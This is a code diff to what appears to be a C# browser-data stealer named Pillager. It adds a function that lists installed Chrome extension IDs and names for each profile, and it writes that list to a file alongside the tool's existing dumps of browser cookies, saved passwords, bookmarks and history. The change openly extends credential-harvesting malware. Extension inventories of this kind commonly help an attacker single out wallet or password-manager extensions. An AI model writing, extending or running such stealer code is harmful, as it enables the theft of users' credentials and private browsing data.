@@ -251,6 +251,38 @@ namespace Pillager.Browsers
             return stringBuilder.ToString();
         }
 
+        public static string Chrome_extensions()
+        {
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (var profile in profiles)
+            {
+                string chrome_extension_path = Path.Combine(BrowserPath, profile + "\\Extensions");
+                if (Directory.Exists(chrome_extension_path))
+                {
+                    foreach (string item in Directory.GetDirectories(chrome_extension_path))
+                    {
+                        try
+                        {
+                            string manifest = Path.Combine(Directory.GetDirectories(item)[0], "manifest.json");
+                            var pattern = new System.Text.RegularExpressions.Regex("\"name\": \"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(manifest));
+                            foreach (System.Text.RegularExpressions.Match prof in pattern)
+                            {
+                                if (prof.Success)
+                                {
+                                    string id = Path.GetFileName(item);
+                                    string name = prof.Groups[1].Value;
+                                    stringBuilder.AppendLine(id + "    " + name);
+                                }
+                            }
+                        }
+                        catch
+                        { }
+                    }
+                }
+            }
+            return stringBuilder.ToString();
+        }
+
         public static void Save(string path)
         {
             foreach (var browser in browserOnChromium)
@@ -281,10 +313,12 @@ namespace Pillager.Browsers
                     string passwords = Chrome_passwords();
                     string books = Chrome_books();
                     string history = Chrome_history();
+                    string extension = Chrome_extensions();
                     if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
                     if (!string.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
                     if (!string.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                     if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                    if (!string.IsNullOrEmpty(extension)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_extension.txt"), extension);
                     foreach (var profile in profiles)
                     {
                         Directory.CreateDirectory(Path.Combine(BrowserPath, profile));
